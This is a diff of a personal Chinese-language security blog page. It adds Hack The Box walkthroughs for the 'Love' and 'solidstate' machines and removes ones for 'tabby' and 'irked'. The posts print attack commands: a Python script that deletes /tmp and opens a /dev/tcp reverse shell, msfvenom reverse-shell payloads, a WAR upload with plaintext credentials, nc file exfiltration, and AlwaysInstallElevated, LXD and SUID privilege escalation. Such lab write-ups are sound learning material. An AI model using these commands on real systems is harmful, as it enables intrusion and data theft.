@@ -71,6 +71,166 @@
       <div class="outer">
         <section id="main">
   
+    <article id="post-Love" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2024/12/11/Love/" class="article-date">
+  <time class="dt-published" datetime="2024-12-12T01:23:49.000Z" itemprop="datePublished">2024-12-11</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2024/12/11/Love/">Love</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2024/12/11/Love/nmap1.png">
+可以看到开放的端口较多，继续用nmap对低端口进行扫描
+<img src="/2024/12/11/Love/nmap2.1.png">
+<img src="/2024/12/11/Love/nmap2.2.png">
+443端口在nmap时是有一个子域名的,可以把它加到/etc/hosts里
+<img src="/2024/12/11/Love/nmap3.png">
+这里可以直接
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;1i x.x.x.x love.htb&#x27;</span> /etc/hosts</span><br></pre></td></tr></table></figure>
+直接添加到第一行
+如果是想插入到最后一行，是
+<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">sed -i <span class="string">&#x27;$a x.x.x.x love.htb&#x27;</span> /etc/hosts</span><br></pre></td></tr></table></figure>
+
+<h4 id="web部分"><a href="#web部分" class="headerlink" title="web部分"></a>web部分</h4><img src="/2024/12/11/Love/web80_1.png">
+80端口是一个voting system的页面,需要voter's ID和password,目前我们在这上面并没有突破点<br>
+当我们尝试去访问443端口时，我们会发现它返回的是403 forbidden,查看其证书的时候也表示它的子域名是staging.love.htb,所以我们可以尝试用staging.love.htb去访问一下看看
+<img src="/2024/12/11/Love/web_443_1.png">
+<img src="/2024/12/11/Love/web_443_2.png">
+有一个Home和一个Demo,Home页面应该就是一个简单的注册投票页面，Demo里看起来是一个扫描文件的页面
+<img src="/2024/12/11/Love/web_443_3.png">
+我们可以尝试让他来扫描我们本地的文件，是可以扫到的
+<img src="/2024/12/11/Love/web_443_4.png">
+我们接下来可以尝试去扫127.0.0.1看看有没有做限制
+<img src="/2024/12/11/Love/web_443_5.png">
+我们还有一个5000端口没有访问过，可以一起看看
+<img src="/2024/12/11/Love/web_443_6.png">
+可以看到，我们直接scan到了一个username和一个password<br>
+再我们对目录进行扫描后，我们可以看到一个/admin,出来的登录页面是需要username和password的，和之前看到的需要voter's ID和password不一样，所以我们可以尝试用刚才scan到的用户名密码尝试登录一下
+<img src="/2024/12/11/Love/dirsearch.png">
+<img src="/2024/12/11/Love/web_80_admin.png">
+<img src="/2024/12/11/Love/web_80_2.png">
+用searchspolit搜索voting system,可以看到几个结果，尝试File Upload RCE
+<img src="/2024/12/11/Love/voting_system.png">
+获得了user权限
+<img src="/2024/12/11/Love/user.png">
+或者我们可以在update中上传图片里传一个图片马，直接执行反弹shell的命令来实现user权限的获取
+<img src="/2024/12/11/Love/update_upload.png">
+
+<h4 id="root权限"><a href="#root权限" class="headerlink" title="root权限"></a>root权限</h4><p>得到user权限后，我们可以上传winPEAS.exe进行信息收集，可以看到该靶机的AlwaysInstallElevated 中HKLM和HKCU都是1,HKLM是HKEY_LOCAL_MACHINE,HKCU是HLEY_CURRENT_USER,它控制MSI安装包是否可以在管理员权限下运行，如果两者的值都是1,在使用msiexec执行msi安装包的时候，windows installer服务会在system上下文中运行msi包，而不是普通用户的上下文<br><img src="/2024/12/11/Love/root_1.png"><br>用msfvenom生成一个反弹windows shell的msi文件，上传到靶机，然后执行，最后我们就获得到里root权限<br><img src="/2024/12/11/Love/root_2.png"><br><code>msiexec /quiet /qn /i rev.msi</code>的意思是启用完全静默模式，无用户界面，&#x2F;i是安装模式为（install）<br><img src="/2024/12/11/Love/root_3.png"><br><img src="/2024/12/11/Love/root_4.png"></p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2024/12/11/Love/" data-id="cm4kp0xck0000b8cpd59kaeqx" data-title="Love" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
+    <article id="post-solidstate" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
+  <div class="article-meta">
+    <a href="/2022/09/10/solidstate/" class="article-date">
+  <time class="dt-published" datetime="2022-09-10T05:15:09.000Z" itemprop="datePublished">2022-09-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2022/09/10/solidstate/">solidstate</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/10/solidstate/nmap1.png">
+<img src="/2022/09/10/solidstate/nmap2.png">
+#### port explore
+22:ssh
+25:smtp
+80:一个安全公司的宣传网站
+110:pop3
+119:nntp
+4555:JAMES Remote Administration Tool 2.3.2
+#### 目录扫描
+<img src="/2022/09/10/solidstate/dir.png">
+存在一个README.TXT表明是由html5up搭建的
+有一个assets目录和一个images的目录可以翻阅
+James Mail Server
+25,110,119,4555端口都是james Mail server在监听
+所以尝试从这个软件下手
+searchsploit james server
+<img src="/2022/09/10/solidstate/sploit.png">
+2.3.2版本存在RCE
+35513.py文件中表示james的默认密码为root/root
+在网页上访问4555端口会显示一个静态页面，用nc访问后会提示输入用户名密码
+<img src="/2022/09/10/solidstate/james.png">
+确实是弱口令,并且存在几个用户
+<img src="/2022/09/10/solidstate/account.png">
+用35513.py试试能不能进行rce
+telnet可以连接到pop3的端口上
+user xxx
+pass xxx
+list
+`retr`:read mail
+在john的邮箱里存在一封邮件
+<img src="/2022/09/10/solidstate/mail.png">
+在mindy的邮箱里有mindy登录目标机器的ssh用户和密码username: mindy/pass: P@55W0rd1!2@
+通过50347.py写入一个反弹shell加上通过mindy登录ssh获得一个反弹的shell
+<img src="/2022/09/10/solidstate/ssh+login.png">
+`find / -writable -type f 2>/dev/null`找可写文件
+在opt下面有一个root权限的tmp.py文件
+那我们写一个相同的文件覆盖它
+    #!/usr/bin/env python
+    import os
+    import sys
+    try:
+         os.system('rm -r /tmp/* ')
+    except:
+         sys.exit()
+    os.system('bash -c "bash -i >& /dev/tcp/10.10.14.2/1234 0>&1"')
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="http://example.com/2022/09/10/solidstate/" data-id="cm4kp0xco0001b8cp5dk83e34" data-title="solidstate" class="article-share-link">Share</a>
+      
+      
+      
+    </footer>
+  </div>
+  
+</article>
+
+
+
+  
     <article id="post-nineveh" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
   <div class="article-meta">
     <a href="/2022/09/07/nineveh/" class="article-date">
@@ -743,188 +903,6 @@ searchsploit后发现确实存在一个rce漏洞针对nostromo
 
 
   
-    <article id="post-tabby" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/09/03/tabby/" class="article-date">
-  <time class="dt-published" datetime="2022-09-03T11:43:34.000Z" itemprop="datePublished">2022-09-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/09/03/tabby/">tabby</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/03/tabby/nmap.png">
-#### port explore
-22
-80:80是一个bootstrap themes搭起来的网站
-8080:8080是一个tomcat部署成功的默认界面,尝试了默认密码没有成功
-#### 目录扫描
-<img src="/2022/09/03/tabby/80.png">
-<img src="/2022/09/03/tabby/8080.png">
-先看80端口的readme表明是一个模板创建的，assets目录不允许访问，index.php/login好像也不能访问，80端口的news指向了一个megahosting.htb的域名，先将他的信息添加到/etc/hosts中，然后访问，得到一个信息是之前存在一个数据泄漏，但现在已经被移除了
-看8080端口的页面，一个manage需要登录
-#### get tomcat cred
-<img src="/2022/09/03/tabby/info.png">
-根据之前的提示，我们可以尝试文件包含，确认存在文件包含漏洞
-tomcat说users都被定义在/etc/tomcat9/tomcat-users.xml中
-但是没有内容，在搜索后得出tomcat9的配置文件有两个
-usr/share/tomcat9/etc/tomcat-users.xml是另一个配置文件存在的地方
-<img src="/2022/09/03/tabby/tomcat.png">
-得到用户名密码为tomcat-$3cureP4s5w0rd123!
-该用户能登录到host-manager界面
-rolename存在admin-gui和manager-script
-manager-scrript允许我们访问text-based web service located at /manager/text
-尝试访问/manager/text/list
-<img src="/2022/09/03/tabby/list.png">
-这样我们就拥有了部署war包的权限
-使用msfvenom生成一个war
-`msfvenom -p java/shell_reverse_tcp lhost=10.10.14.4 lport=8888 -f war -o rev.10.10.14.4-8888.war`
-传上去试一下
-`curl -u 'tomcat:$3cureP4s5w0rd123!' http://10.10.10.194:8080/manager/text/deploy?path=/abc --upload-file rev.10.10.14.14-8888.war`
-<img src="/2022/09/03/tabby/upload.png">
-访问文件触发,获得了tomcat的权限
-<img src="/2022/09/03/tabby/user.png">
-`python3 -c 'import pty;pty.spawn("bash")'`提升shell模式
-在/var/www/html/files中有一个所有者是ash的backup文件
-用nc把它拷到本地
-`
-cat 16162020_backup.zip | nc 10.10.14.4 9999
-nc -lvnp 9999 > 16162020_backup.zip
-`
-用zip2john创建这个zip的hash
-`zip2john 16162020_backup.zip -o 16162020_backup.zip.john`
-用john破解zip的密码
-<img src="/2022/09/03/tabby/zip.png">
-密码是admin@it
-切换到ash
-<img src="/2022/09/03/tabby/userflag.png">
-#### root
-先尝试sudo -l,发现没有
-传一个linenum.sh上去
-<img src="/2022/09/03/tabby/id.png">
-adm 权限可以读取log files
-#### lxd提权
-创建一个容器挂载到root下面，然后就能够获得root的权限
-<img src="/2022/09/03/tabby/lxclist.png">
-目前该机器上并没有挂载容器
-先下载一个container到本机
-(LXD Alpina Linux image builder)[https://github.com/saghul/lxd-alpine-builder.git]
-这个工具创建了一个LXD Alpina Linux container image 
-把生成的tar.gz传到靶机
-接下来将该镜像导入lxc
-`lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias abcimage`
-`lxd init`
-`lxc init abcimage abccontainer -c security.privileged=true`
-`lxc config device add abccontainer abcdevice disk source=/ path=/mnt/root recursive=true`
-<img src="/2022/09/03/tabby/list2.png">
-`lxc start abccontainer`
-<img src="/2022/09/03/tabby/list3.png">
-`lxc exec abccontainer /bin/sh`
-<img src="/2022/09/03/tabby/root.png">
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/09/03/tabby/" data-id="cl7lzagut00001ecp6mq26uen" data-title="tabby" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-irked" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2022/09/03/irked/" class="article-date">
-  <time class="dt-published" datetime="2022-09-03T05:54:07.000Z" itemprop="datePublished">2022-09-03</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2022/09/03/irked/">irked</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <h4 id="nmap-scan"><a href="#nmap-scan" class="headerlink" title="nmap scan"></a>nmap scan</h4><img src="/2022/09/03/irked/nmap.png">
-#### port explore
-22端口需要登录
-80端口是一张图片
-111端口可能是rpc服务
-剩下的端口不知道干什么的
-#### 目录扫描
-<img src="/2022/09/03/irked/dir.png">
-扫到一个apache的手动目录
-#### exploits
-searchsploit高端口的unrealircd,会发现几个可以利用的版本
-直接去github上找一个同样的py脚本
-<img src="/2022/09/03/irked/user.png">
-查找user.txt发现在另一个使用者目录下，但是我们现在没有权限
-#### shell as djmardov
-在documents目录下存在一个.backup
-<img src="/2022/09/03/irked/bak.png">
-先下载一个大图
-steghide(命令行下的steg工具)
-`
-extract - 提取数据
--sf irked.jpg - 抽取数据的目标
--p - 密码
-`
-得到一个密码
-<img src="/2022/09/03/irked/pass.png">
-试着用这个密码登录到djmardov
-成功切换到该用户
-#### shell as root
-用ssh连接刚才的用户登录到目标机器
-传一个linenum.sh到上面
-在suid的文件中，有一个viewuser没见过
-<img src="/2022/09/03/irked/viewuser.png">
-测试一下往/tmp/listusers里面echo id
-<img src="/2022/09/03/irked/id.png">
-命令能够成功执行
-echo sh > /etc/listusers
-<img src="/2022/09/03/irked/root.png">
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://example.com/2022/09/03/irked/" data-id="cl7ljp8uh0000m7cpcfvf5u8u" data-title="irked" class="article-share-link">Share</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
 
 
   <nav id="page-nav">
@@ -948,7 +926,7 @@ echo sh > /etc/listusers
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2024/12/">December 2024</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/09/">September 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/08/">August 2022</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2022/07/">July 2022</a></li></ul>
     </div>
   </div>
 
@@ -961,6 +939,14 @@ echo sh > /etc/listusers
       <ul>
         
           <li>
+            <a href="/2024/12/11/Love/">Love</a>
+          </li>
+        
+          <li>
+            <a href="/2022/09/10/solidstate/">solidstate</a>
+          </li>
+        
+          <li>
             <a href="/2022/09/07/nineveh/">nineveh</a>
           </li>
         
@@ -970,14 +956,6 @@ echo sh > /etc/listusers
         
           <li>
             <a href="/2022/09/06/cronos/">cronos</a>
-          </li>
-        
-          <li>
-            <a href="/2022/09/06/bastard/">bastard</a>
-          </li>
-        
-          <li>
-            <a href="/2022/09/05/popcorn/">popcorn</a>
           </li>
         
       </ul>
@@ -993,7 +971,7 @@ echo sh > /etc/listusers
   <div class="outer">
     <div id="footer-info" class="inner">
       
-      &copy; 2022 John Doe<br>
+      &copy; 2024 John Doe<br>
       Powered by <a href="https://hexo.io/" target="_blank">Hexo</a>
     </div>
   </div>
